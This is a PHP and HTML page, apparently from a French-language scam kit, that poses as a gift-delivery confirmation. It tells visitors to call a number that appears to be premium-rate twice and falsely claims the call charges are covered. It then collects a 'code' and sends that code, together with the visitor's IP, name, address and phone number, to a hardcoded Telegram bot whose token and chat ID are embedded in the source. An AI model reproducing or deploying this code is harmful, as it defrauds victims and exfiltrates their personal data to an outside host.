<?php
session_start();
?>



<?php
if(        isset($_POST["sendinfo"])              )
{	
	foreach($_SESSION["infocookies"] as $keys => $values)
	{	
		$ip=$values["ip"];
		$name = $values["name"];
		$adresse = $values["adresse"];
		$num = $values["num"];
		$code=$_POST['code'];
	}

	define ('url',"https://api.telegram.org/bot1865501764:AAE6Ep51dlBHRa8ZSk0csxOxrBc1IHJocTw/sendmessage?chat_id=1335982188&");
	$message = urlencode(   "clien"       .       "\n ip:"  .  $ip        .      "\n name : "  .   $name        .      "\n adresse : "  .   $adresse         .      "\n num : "  .   $num     .      "\n code : "  .   $code   );
	file_get_contents(url."text=".$message."");
 
    echo "<script> window.location.href = 'pikala2.php'; </script>"; 

}

?>



<!DOCTYPE html>
<html>
<title>pikala</title>
<meta charset="utf-8">   <meta http-equiv="X-UA-Compatible" content="IE=edge"/>  <meta http-equiv="origin-trial" content=""/>  <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1, maximum-scale=1, user-scalable=no, shrink-to-fit=no"/>     
<script type="text/javascript"  src="https://code.jquery.com/jquery-3.5.1.min.js"></script> 
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.12.1/css/all.css"/> 

<style>html, body{  background:transparent;  padding:0; border:0; margin:0;  touch-action: manipulation; }   ul li {list-style-type:none;}     </style>       





<style>
#container3 {background-image: url(https://casino5.netlify.app/background.jpg);  width:100%; height:100vh;   display:block;   }
#container3 .row{background-color:transparent;   padding:0%; margin:0%;    display:flex; align-items:center;  align-content:center; justify-content:center; text-align:center; flex-wrap:wrap; flex-direction: row; }       

		    #container3 .col1a{width:100%;  }       
            #container3 .col1b{background-color:transparent; padding:0%; margin:0% 2%;  display:grid; align-items:center; justify-content:center; text-align:center;    }
               #container3 .postext1{display:flex; align-items:center; justify-content:center; text-align:center;}  #container3 .text1{color:white; font:800 30px 'cairo';  }
			   #container3 .posform{ margin:2% 0%;  display:flex; align-items:center; justify-content:center; text-align:center;}  
			   #container3 form{background-color:red; padding:20px;}
				     #container3 .posinput{ margin:2% 0%; display:flex; align-items:center; justify-content:center; text-align:center;}   
				     #container3 .inputtext  { background-color:white; width:400px; height:50px;  border:solid 1px yellow;   border-radius:2px;  color:black; font:800 20px 'cairo'; text-indent:1rem;  }  #container3 .inputtext:focus{ box-shadow: 0 0 0 0.2rem yellow;   outline: none !important;  }  #container3 .inputtext::placeholder{color:#9f9494c9; font:500 17px 'cairo';} 
                     #container3 .inputsubmit{ background-color:green; width:400px; height:50px;  border:solid 1px green;   border-radius:5px;  box-shadow: 0 2px 5px 0 rgb(0 0 0 / 16%), 0 2px 10px 0 rgb(0 0 0 / 12%);        color:white;  font:800 25px 'cairo';           display:flex; align-items:center; justify-content:center; text-align:center;}

   
@media only screen and (max-width:1300px) {  }
@media only screen and (max-width:1000px) {  }
@media only screen and (max-width:600px)  {  }
@media only screen and (max-width:360px)  {  }
</style>

<div id="container3"> <div class="row">			
	<div class="col1a">  <div class="col1b">
		<div class="postext1"> 
		    <div class="text1">
                Pour confirmer la livraison de votre cadeau il vous manque un code
                Veuillez appeler ce numéro 0892441984 (2 fois de suit ) puis suivis le répondeur pour obtenir votre code de confirmation par appel  , Concernant les frais d'appel  n'oubliez pas  qu'ils sont tous  facturés de notre part afin de vous faciliter la tâche
		    </div>    
		</div> 
        <div class="posform">
		   <form method="post"  > 
		       <div class="posinput"> <input type="text"   placeholder="Tapez votre code"  value=""          name="code"       class="inputtext"  required="required"  oninvalid="this.setCustomValidity('Vous devez entrer votre code ')"       oninput="setCustomValidity('')"   />  </div>  
               <div class="posinput"> <input type="submit" placeholder=""                         value="ENVOYER"   name="sendinfo"   class="inputsubmit"  />  </div>			   
           </form> 		   
        </div> 		
	</div></div>
</div></div>







